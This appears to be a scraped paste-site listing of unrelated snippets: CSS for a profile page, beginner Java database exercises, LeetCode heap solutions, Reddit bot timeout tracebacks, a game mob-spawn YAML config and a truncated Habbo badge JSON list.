#id_comments h2 + div {background-position-y: -630px;}
#id_comments:has(h2 + div a) h2 + div:hover {background-position-x: -170px;}
#columns::after {background-position: bottom right;}

/* Fonts */

@font-face {
    font-family: 'Open Sans';
    font-style: normal;
    font-weight: 400;
    src: local('Open Sans'), local('OpenSans-Regular'), url('https://fonts.gstatic.com/s/opensans/v34/memvYaGs126MiZpBA-UvWbX2vVnXBbObj2OVTS-muw.woff2') format('woff2');
}

@font-face {
    font-family: 'Open Sans';
    font-style: normal;
    font-weight: 700;
    src: local('Open Sans Bold'), local('OpenSans-Bold'), url('https://fonts.gstatic.com/s/opensans/v34/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsg-1x4gaVI.woff2') format('woff2');
}

@font-face {
    font-family: 'Font Awesome';
    font-style: normal;
    font-weight: 900;
    src: url('https://ka-f.fontawesome.com/releases/v6.5.1/webfonts/free-fa-solid-900.woff2') format('woff2');
}

/* Header */

#gaia_header {background: none !important;}
#gaia_header li {margin: 0 5px;}
#gaia_header li.spacer {display: none !important;}

#gaia_header ul {
	width: auto !important;
	height: 30px !important;
	font: 0/30px 'Open Sans', sans-serif !important;
	padding: 0 5px !important;
	margin: 10px 0 !important;
	box-shadow: 3px 3px 5px #0C203080;
}

#gaia_header #header_left {
	background: #FFFFFF !important;
	border-radius: 0 5px 5px 0;
}

#gaia_header #header_right {
	float: right;
	border-radius: 5px 0 0 5px;
}

#header_left img {
   -webkit-mask: url('https://i.imgur.com/cGGVY2x.png') 0 0 no-repeat;
	mask: url('https://i.imgur.com/cGGVY2x.png') 0 0 no-repeat;
    background: currentColor;
	width: 0;
	height: 15px;
	padding: 0 34px 0 0;
	transition: background .5s ease-in-out;
}

#gaia_header a, #header_right a::before {font-size: 13px !important;}
#header_left a {color: #000 !important;}
#header_right a {color: #FFFFFF !important;}
#gaia_header ul a:hover {color: var(--pink) !important;}

#header_right a[href*='mode=edit'], #header_right a[href*='report.php'] {font-size: 0 !important;}
#header_right a[href*='mode=edit']::before {content: 'My Profile';}
#header_right a[href*='report.php']::before {content: 'File Report';}

/* Set Up Layout */

#panel-details, #panel-details *, #columns, #pictures_container, #texts_container {position: absolute;}
#panel-details .ft {display: none;}

#panel-details, #panel-details .bd {
	width: 100%;
	height: 100%;
	top: 0;
	left: 0;
}

#panel-details .hd, #columns, #pictures_container, #texts_container {
	top: calc(50% - 304px);
	left: calc(50% - 490px);
}

#panel-details .hd, #columns {
	width: 980px;
	height: 610px;
}

/* Wallpaper Overlay Effect */

#panel-details h2 {
	background: linear-gradient(to bottom, #B692F8, #40E4B8, #B692F8);
	width: 685px;
	height: 385px;
	top: 27px;
	left: 160px;
	border-radius: 50px;
	box-shadow: 5px 5px 10px #0C203080;
}

#panel-details .bd {
	background: 
		linear-gradient(to right,
			transparent calc(50% - 574px), var(--purp) calc(50% - 574px),
			var(--purp) calc(50% - 566px), transparent calc(50% - 566px),
			transparent calc(50% - 558px), var(--aqua) calc(50% - 558px),
			var(--aqua) calc(50% - 550px), transparent calc(50% - 550px)
		),
		linear-gradient(to right,
			#000000FF calc(50% - 200px), #00000000 calc(50% - 200px),
			#00000000 calc(50% - 196px), #000000FF calc(50% - 196px),
			#000000FF calc(50% - 184px), #00000000 calc(50% - 184px),
			#00000000 calc(50% - 180px), #000000FF calc(50% - 180px),
			#000000FF calc(50% - 176px), #00000000 calc(50% - 176px)
		);
}

/* Columns */

#columns {overflow: visible;}
#columns .column {display: contents;}

@keyframes ghost {
    0% {
        rotate: 0turn;
        opacity: 0;
        animation-timing-function: linear;
    }
    5% {
        opacity: 1;
        animation-timing-function: ease-in-out;
    }
    20% {
        opacity: 1;
        animation-timing-function: ease-in-out;
    }
    25% {
        opacity: 0;
        animation-timing-function: ease-in-out;
    }
    100% {
        rotate: 2turn;
        opacity: 0;
        animation-timing-function: linear;
    }
}

#columns::after {
    content: '';
    width: 364px;
    height: 196px;
    position: absolute;
    top: 220px;
    left: -35px;
    transform-origin: 192px 77px;
    pointer-events: none;
    animation: ghost 20s linear infinite;
}

#columns ::-webkit-scrollbar {width: 0;}
.panel {scrollbar-width: none;}

/* Panels */

.panel {
	background: none;
	color: #FFFFFF;
	font: 11px/1.75 'Open Sans', sans-serif;
	text-align: center;
	padding: 0;
	margin: 0;
	position: absolute;
	box-sizing: border-box;
	overflow: hidden;
}
.panel h2 {display: none;}

.panel a {color: var(--aqua);}
.panel a:hover {color: var(--pink);}

#id_about, #id_wishlist {
	height: 290px;
	top: 167px;
	overflow-y: scroll;
	overscroll-behavior: contain;
}

#id_about {
	width: 235px;
	right: 205px;
}
#id_about img {max-width: 100%;}

/* Comments */

#id_comments {
	width: 165px;
	height: 218px;
	top: 109px;
	right: 17px;
	clip-path: path('M 0 107 C 15 90 15 70 30 44 C 50 10 75 3 95 3 C 120 3 162 25 162 75 C 162 162 15 210 0 215 Z');
}
#id_comments #alerts_banner, #id_comments p, #id_comments dl, #id_comments .clear {display: none;}
#id_comments #alert_container {display: contents;}

#id_comments h2 + div, #id_comments a {
	width: 100%;
	height: 100%;
}

#id_comments a {
	display: block;
	font-size: 0;
}

/* Contact Buttons */

#id_contact {
	text-align: center;
	top: 317px;
	right: 40px;
	overflow: visible;
}
#id_contact li {margin-top: 15px;}

#id_contact li * {
	display: block;
	background: #000;
	width: 60px;
	height: 60px;
	font-size: 0;
	border-radius: 15px;
	box-shadow: 3px 3px 5px #0C203080;
}
#id_contact li *::before {font: 25px/60px 'Font Awesome';}
#id_contact li:nth-of-type(1) *::before {content: '';}
#id_contact li:nth-of-type(2) *::before {content: '';}
#id_contact li:nth-of-type(3) *::before {content: '';}

#id_contact a {color: #FFFFFF;}
#id_contact a:hover {color: var(--pink);}

/* Media */

.media_panel {
	background: url('https://i.imgur.com/MWTKBXK.gif') center no-repeat !important;
	width: 30px;
	height: 30px !important;
	bottom: 89px;
	left: 26px;
	border-radius: 50%;
}

.media_panel iframe {
	width: 300px;
	height:	200px;
	position: absolute;
	bottom: -5px;
	left: -18px;
	opacity: .001;
}

/* Wish List */

#id_wishlist {
	display: flex;
	flex-flow: row wrap;
	align-content: start;
	gap: 10px;
	width: 140px;
	left: 345px;
	scroll-snap-type: y mandatory;
}
#id_wishlist .clear, .premium_sparkle {display: none;}

#id_wishlist .item {
	position: relative;
	scroll-snap-align: start;
}

#id_wishlist a {
	display: block;
	background: #5A5A5A;
	width: 30px;
	height: 30px;
	padding: 5px;
	border-radius: 5px;
	transition: all .5s ease-in-out;
}
#id_wishlist a:hover {background: var(--pink);}

.owner_checkmark {
	background: #FFFFFF;
	padding: 2px;
	margin: 0;
	bottom: -1px;
	left: -1px;
	border: 1px solid #000;
}"
SAMf4W4d,Day 16 read,HarrJ,Java,Sunday 18th of February 2024 09:24:55 PM CDT,"package week3;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet; // pang select query

public class Day16E {
    private String address = ""jdbc:mysql://localhost:3306/db_jtvi_b8_23"";
    private String userName = ""root"";
    private String passWord = """";
    
    public static void main(String[] args) {
        Day16E callMe = new Day16E();
        callMe.getAllRows();
    }
    
    void getAllRows() {
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            String sqlQuery = ""SELECT fld_traineeid, fld_fname""
                    + "" , fld_lname, fld_email, fld_phone ""
                    + "" FROM tbl_trainee_list;"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            
            ResultSet rs = stmt.executeQuery();
            
            while (rs.next()) {
                System.out.printf(""%d | %s | %s | %s | %s%n""
                    , rs.getInt(1)
                    , rs.getString(2)
                    , rs.getString(3)
                    , rs.getString(4)
                    , rs.getString(5)
                );
            }
            
            System.out.println( rs );
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
}
"
NTCQSuVR,Untitled,smj007,Python,Sunday 18th of February 2024 09:16:15 PM CDT,"class Solution:
    def lastStoneWeight(self, stones: List[int]) -> int:
        
        stones = [-s for s in stones]
        heapq.heapify(stones)

        while (len(stones) > 1):
            x = heapq.heappop(stones)
            y = heapq.heappop(stones)
            if x!=y :
                heapq.heappush(stones, x - y)

        return -stones[0] if len(stones) > 0 else 0"
wDdS1ZSb,RequestException: error with request,basedcount_bot,Python,Sunday 18th of February 2024 09:04:03 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/requestor.py"", line 64, in request
    return await self._http.request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/aiohttp/client.py"", line 560, in _request
    await resp.start(conn)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/aiohttp/client_reqrep.py"", line 894, in start
    with self._timer:
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/aiohttp/helpers.py"", line 721, in __exit__
    raise asyncio.TimeoutError from None
asyncio.exceptions.TimeoutError

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 45, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 262, in read_comments
    async for comment in pcm_subreddit.stream.comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/util.py"", line 160, in stream_generator
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/util.py"", line 160, in <listcomp>
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/listing/generator.py"", line 34, in __anext__
    await self._next_batch()
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/reddit.py"", line 785, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/reddit.py"", line 567, in _objectify_request
    await self.request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/reddit.py"", line 1032, in request
    return await self._core.request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/sessions.py"", line 370, in request
    return await self._request_with_retries(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/sessions.py"", line 270, in _request_with_retries
    response, saved_exception = await self._make_request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/sessions.py"", line 187, in _make_request
    response = await self._rate_limiter.call(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/rate_limit.py"", line 35, in call
    response = await request_function(*args, **kwargs)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/requestor.py"", line 68, in request
    raise RequestException(exc, args, kwargs)
asyncprawcore.exceptions.RequestException: error with request 
"
wfFy22MX,Untitled,Lxlp,YAML,Sunday 18th of February 2024 08:57:45 PM CDT,"Neos_NETHER:
  Action: ADD
  Type: AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino
  Chance: 0.01
  Priority: 1
  UseWorldScaling: false
  Worlds: dimension_nether
  Conditions:
  - playersOnline{amount=<11}
  - mobsInRadius{types=AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino;amount=>3;radius=73} false

Neos_NETHER_2:
  Action: ADD
  Type: AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino
  Chance: 0.03
  Priority: 1
  UseWorldScaling: false
  Worlds: dimension_nether
  Conditions:
  - playersOnline{amount=11to20}
  - mobsInRadius{types=AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino;amount=>3;radius=73} false
  
Neos_NETHER_3:
  Action: ADD
  Type: AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino
  Chance: 0.05
  Priority: 1
  UseWorldScaling: false
  Worlds: dimension_nether
  Conditions:
  - playersOnline{amount=21to30}
  - mobsInRadius{types=AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino;amount=>3;radius=73} false

Neos_NETHER_4:
  Action: ADD
  Type: AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino
  Chance: 0.07
  Priority: 1
  UseWorldScaling: false
  Worlds: dimension_nether
  Conditions:
  - playersOnline{amount=31to40}
  - mobsInRadius{types=AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino;amount=>3;radius=73} false
  
Neos_NETHER_5:
  Action: ADD
  Type: AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino
  Chance: 0.09
  Priority: 1
  UseWorldScaling: false
  Worlds: dimension_nether
  Conditions:
  - playersOnline{amount=41to50}
  - mobsInRadius{types=AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino;amount=>3;radius=73} false

Neos_NETHER_6:
  Action: ADD
  Type: AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino
  Chance: 0.1
  Priority: 1
  UseWorldScaling: false
  Worlds: dimension_nether
  Conditions:
  - playersOnline{amount=>50}
  - mobsInRadius{types=AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino;amount=>3;radius=73} false

Neos_NETHER_Single:
  Action: ADD
  Type: AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino
  Chance: 0.05
  Priority: 2
  UseWorldScaling: false
  Worlds: dimension_nether
  Conditions:
  - playersinradius{amount=1;radius=40}
  - mobsInRadius{types=AnimaErrante,GolemInfernale,BrutaleInfernale,PuntaNether,PrimoSpadaccino;amount=>3;radius=73} false
"
seZK5id3,RequestException: error with request,basedcount_bot,Python,Sunday 18th of February 2024 08:54:32 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/requestor.py"", line 64, in request
    return await self._http.request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/aiohttp/client.py"", line 560, in _request
    await resp.start(conn)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/aiohttp/client_reqrep.py"", line 894, in start
    with self._timer:
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/aiohttp/helpers.py"", line 721, in __exit__
    raise asyncio.TimeoutError from None
asyncio.exceptions.TimeoutError

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 45, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 122, in check_mail
    async for message in reddit_instance.inbox.unread(limit=None):  # Message
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/listing/generator.py"", line 34, in __anext__
    await self._next_batch()
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/reddit.py"", line 785, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/reddit.py"", line 567, in _objectify_request
    await self.request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/reddit.py"", line 1032, in request
    return await self._core.request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/sessions.py"", line 370, in request
    return await self._request_with_retries(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/sessions.py"", line 270, in _request_with_retries
    response, saved_exception = await self._make_request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/sessions.py"", line 187, in _make_request
    response = await self._rate_limiter.call(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/rate_limit.py"", line 35, in call
    response = await request_function(*args, **kwargs)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/requestor.py"", line 68, in request
    raise RequestException(exc, args, kwargs)
asyncprawcore.exceptions.RequestException: error with request 
"
34Z4kmdF,RequestException: error with request,basedcount_bot,Python,Sunday 18th of February 2024 08:54:31 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/requestor.py"", line 64, in request
    return await self._http.request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/aiohttp/client.py"", line 467, in _request
    with timer:
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/aiohttp/helpers.py"", line 721, in __exit__
    raise asyncio.TimeoutError from None
asyncio.exceptions.TimeoutError

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 45, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 262, in read_comments
    async for comment in pcm_subreddit.stream.comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/util.py"", line 160, in stream_generator
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/util.py"", line 160, in <listcomp>
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/listing/generator.py"", line 34, in __anext__
    await self._next_batch()
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/reddit.py"", line 785, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/reddit.py"", line 567, in _objectify_request
    await self.request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncpraw/reddit.py"", line 1032, in request
    return await self._core.request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/sessions.py"", line 370, in request
    return await self._request_with_retries(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/sessions.py"", line 270, in _request_with_retries
    response, saved_exception = await self._make_request(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/sessions.py"", line 187, in _make_request
    response = await self._rate_limiter.call(
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/rate_limit.py"", line 35, in call
    response = await request_function(*args, **kwargs)
  File ""/root/Bots/basedcount_bot/venv/lib/python3.10/site-packages/asyncprawcore/requestor.py"", line 68, in request
    raise RequestException(exc, args, kwargs)
asyncprawcore.exceptions.RequestException: error with request 
"
qJmK5c3d,Day 16 only create,HarrJ,Java,Sunday 18th of February 2024 08:49:00 PM CDT,"package week3;

import java.util.Scanner;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

// using tbl_trainee_list from Day 12E, 13A file
public class Day16D {
    private String address = ""jdbc:mysql://localhost:3306/db_jtvi_b8_23"";
    private String userName = ""root"";
    private String passWord = """";
    
    public static void main(String[] args) {
        Day16D callMe = new Day16D();
        Scanner sc = new Scanner(System.in);
        String fName, lName, email, phone;
        int rowResult = 0;
        // enter user info part
        System.out.print(""Enter first name : "");
        fName = sc.nextLine();
         
        System.out.print(""Enter last name : "");
        lName = sc.nextLine();
        
        System.out.print(""Enter email : "");
        email = sc.nextLine();
        
        System.out.print(""Enter phone : "");
        phone = sc.nextLine();
        
        // execute sql query part
        rowResult = callMe.addNewRow(fName, lName, email, phone);
        
        if (rowResult == 1) {
            System.out.println(""New Row Added"");
        } else {
            System.out.println(rowResult + ""row(s) affected"");
        }
    }
    
    int addNewRow(String fName, String lName, String email, String phone) {
        int rowsAffected = 0;
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            String sqlQuery = ""INSERT INTO tbl_trainee_list""
                + "" (fld_fname, fld_lname, fld_email, fld_phone)""
                + "" VALUES (?, ?, ?, ?)"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            stmt.setString(1, fName);
            stmt.setString(2, lName);
            stmt.setString(3, email);
            stmt.setString(4, phone);
            
            rowsAffected = stmt.executeUpdate();
            
            conn.close();
        } catch (Exception e) {
            rowsAffected = -1;
        }
        return rowsAffected;
    }
}

//CREATE TABLE tbl_trainee_list ( fld_traineeid INT NOT NULL AUTO_INCREMENT PRIMARY KEY, fld_fname VARCHAR(25), fld_lname VARCHAR(15), fld_email VARCHAR(40), fld_phone VARCHAR(16) NOT NULL DEFAULT 'to-follow');"
RgaV9yAn,Mad,Unknown_No_1,PHP,Sunday 18th of February 2024 08:22:27 PM CDT,FeedbackBhejoWarnaKeyExpire
KnG2ndXn,Day 16 with scanner,HarrJ,Java,Sunday 18th of February 2024 08:21:21 PM CDT,"package week3;

import java.util.Scanner;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

public class Day16C {
    private String address = ""jdbc:mysql://localhost:3306/db_jtvi_b8_23"";
    private String userName = ""jtvi23b8""; //default ""root""
    private String passWord = ""demo""; 
    
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        Day16C callMe = new Day16C();
        boolean isValid = true;
        String itemName;
        String itemDesc;
        double itemValue = 0;
        String userInput;
        int rowResult;
        
        System.out.print(""Enter Item Name: "");
        itemName = sc.nextLine();
        if (itemName.trim().isEmpty()) {
            isValid = false;
        }
        
        System.out.print(""\nEnter Item Description: "");
        itemDesc = sc.nextLine();
        if (itemDesc.trim().isEmpty()) {
            isValid = false;
        }
        
        System.out.print(""\nEnter Item Price: "");
        userInput = sc.nextLine();
        if (isNumeric(userInput)) {
            itemValue = Double.parseDouble(userInput);
            userInput = """";
        } else {
            isValid = false;
        }
        
        if (isValid) {
            System.out.println(""all input ok"");
            rowResult = callMe.addNewRowB(itemName, itemDesc, itemValue);
            
            System.out.println(rowResult + "" rows affected"");
            
        } else {
            System.out.println(""one or more user input have problem"");
        }
        
    }
    
    static boolean isNumeric(String txtIn) {
        boolean isNumber = true;
        if (txtIn.trim().isEmpty()) {
            isNumber = false;
        }
        try {
            double d = Double.parseDouble(txtIn);
        } catch (Exception e) {
            isNumber = false;
        }
        return isNumber;
    }
    
    int addNewRowB (String itemName, String itemDesc, double itemValue) {
        int rowsAffected = 0;
        try {
            Connection conn = DriverManager.getConnection(address, userName, passWord);
            
            String sqlQuery = ""INSERT INTO tbl_item_list""
                    + "" ( fld_item_name , fld_item_desc , fld_item_value)""
                    + "" VALUES (?, ?, ?);"";
            
            PreparedStatement stmt = conn.prepareStatement(sqlQuery);
            stmt.setString(1, itemName); //use proper set, starts at 1
            stmt.setString(2, itemDesc);
            stmt.setDouble(3, itemValue);
            
            rowsAffected = stmt.executeUpdate();
            
            conn.close();
        } catch (Exception e) {
            rowsAffected = -1;
        }
        return rowsAffected;
    }
}
"
cHmnaDPi,Untitled,smj007,Python,Sunday 18th of February 2024 08:18:31 PM CDT,"class KthLargest:

    def __init__(self, k: int, nums: List[int]):
        self.minheap = nums
        self.k = k
        heapq.heapify(self.minheap)
        while len(self.minheap)>self.k:
            heapq.heappop(self.minheap)        

    def add(self, val: int) -> int:
        heapq.heappush(self.minheap, val)
        while len(self.minheap) > self.k:
            heapq.heappop(self.minheap)

        return self.minheap[0]"
VUag1YXD,Mining Turtle Startup,TheDarkElites,Lua,Sunday 18th of February 2024 07:23:36 PM CDT,"local progressData = fs.open(""mineProg/mineData"",""r"")
if progressData ~= nil and progressData.readLine() == ""true"" then
    shell.run(""mine nil nil true"")
end
"
1RwdbxGV,json,Fabriciool,JSON,Sunday 18th of February 2024 07:13:50 PM CDT,"[{""emblema"":""PTD51"",""numero"":717},{""emblema"":""ACH_Profile_Gimmegimme_13"",""numero"":2337},{""emblema"":""DE35H"",""numero"":3558},{""emblema"":""X2310"",""numero"":1215},{""emblema"":""ACH_PetRespectGiver16"",""numero"":685},{""emblema"":""CON06"",""numero"":176},{""emblema"":""ACH_HorseJumping2"",""numero"":15812},{""emblema"":""ACH_HabboBuilder_TSale_4"",""numero"":6017},{""emblema"":""PTD25"",""numero"":113},{""emblema"":""TOE03"",""numero"":301},{""emblema"":""TOE01"",""numero"":1050},{""emblema"":""ACH_HC3"",""numero"":2151},{""emblema"":""ACH_TagC16"",""numero"":2884},{""emblema"":""ACH_RbTagC11"",""numero"":3764},{""emblema"":""NYC38"",""numero"":149},{""emblema"":""ACH_FriendsMaker_SGCollect_10"",""numero"":6003},{""emblema"":""ACH_SkateBoardSlide17"",""numero"":6754},{""emblema"":""ACH_Profile1"",""numero"":6194},{""emblema"":""ACH_Profile2"",""numero"":6035},{""emblema"":""BSA01"",""numero"":6075},{""emblema"":""BRB20"",""numero"":6092},{""emblema"":""DE798"",""numero"":6007},{""emblema"":""IT792"",""numero"":1163},{""emblema"":""UKR01"",""numero"":6706},{""emblema"":""ES41L"",""numero"":1267},{""emblema"":""ES51G"",""numero"":1649},{""emblema"":""RVL23"",""numero"":1843},{""emblema"":""ACH_GiftGiver9"",""numero"":493},{""emblema"":""PTB18"",""numero"":2623},{""emblema"":""PTB07"",""numero"":2676},{""emblema"":""X2138"",""numero"":1100},{""emblema"":""HKT01"",""numero"":6005},{""emblema"":""ACH_FriendsMaker15"",""numero"":723},{""emblema"":""X2118"",""numero"":1705},{""emblema"":""FI446"",""numero"":1536},{""emblema"":""ES78K"",""numero"":1640},{""emblema"":""ES74K"",""numero"":2092},{""emblema"":""ES76K"",""numero"":2348},{""emblema"":""ES75K"",""numero"":3097},{""emblema"":""FR631"",""numero"":1592},{""emblema"":""TC193"",""numero"":2281},{""emblema"":""US230"",""numero"":2667},{""emblema"":""BRB38"",""numero"":1409},{""emblema"":""BRB39"",""numero"":1153},{""emblema"":""IT302"",""numero"":1737},{""emblema"":""BRB62"",""numero"":1028},{""emblema"":""BRB56"",""numero"":1900},{""emblema"":""HSJ22"",""numero"":3635},{""emblema"":""MMS15"",""numero"":6038},{""emblema"":""ERC04"",""numero"":6012},{""emblema"":""ACH_HabboExplorer1"",""numero"":7121},{""emblema"":""ERC12"",""numero"":6011},{""emblema"":""ERC01"",""numero"":4558},{""emblema"":""ERC06"",""numero"":4900},{""emblema"":""ERC07"",""numero"":4897},{""emblema"":""ES71E"",""numero"":2800},{""emblema"":""PT62A"",""numero"":1032},{""emblema"":""PT61A"",""numero"":1511},{""emblema"":""PT88A"",""numero"":1456},{""emblema"":""TTC24"",""numero"":2537},{""emblema"":""TTC23"",""numero"":2373},{""emblema"":""PT87A"",""numero"":2133},{""emblema"":""ACH_TradingPass1"",""numero"":6015},{""emblema"":""ACH_TradingPass4"",""numero"":6115},{""emblema"":""ACH_Tutorial4"",""numero"":6640},{""emblema"":""TTC05"",""numero"":1898},{""emblema"":""TYOU1"",""numero"":6058},{""emblema"":""TYOU2"",""numero"":6033},{""emblema"":""ACH_Tutorial5"",""numero"":6398},{""emblema"":""ACH_TradingPass2"",""numero"":6805},{""emblema"":""ACH_TradingPass5"",""numero"":6100},{""emblema"":""ACH_Tutorial1"",""numero"":6545},{""emblema"":""ACH_Tutorial3"",""numero"":6157},{""emblema"":""ACH_TradingPass3"",""numero"":6367},{""emblema"":""ACH_TradingPass6"",""numero"":6425},{""emblema"":""ACH_TradingPass7"",""numero"":6464},{""emblema"":""ACH_Tutorial2"",""numero"":6430},{""emblema"":""BAB07"",""numero"":592},{""emblema"":""BAB05"",""numero"":1042},{""emblema"":""HSE12"",""numero"":641},{""emblema"":""HSE09"",""numero"":1693},{""emblema"":""HSE10"",""numero"":1451},{""emblema"":""CBP29"",""numero"":744},{""emblema"":""CBP14"",""numero"":409},{""emblema"":""CBP20"",""numero"":1510},{""emblema"":""CBP21"",""numero"":1628},{""emblema"":""CBP18"",""numero"":1768},{""emblema"":""CBP12"",""numero"":2188},{""emblema"":""CBP19"",""numero"":1909},{""emblema"":""CBP11"",""numero"":2392},{""emblema"":""CBP22"",""numero"":2435},{""emblema"":""CBP15"",""numero"":2512},{""emblema"":""HTW35"",""numer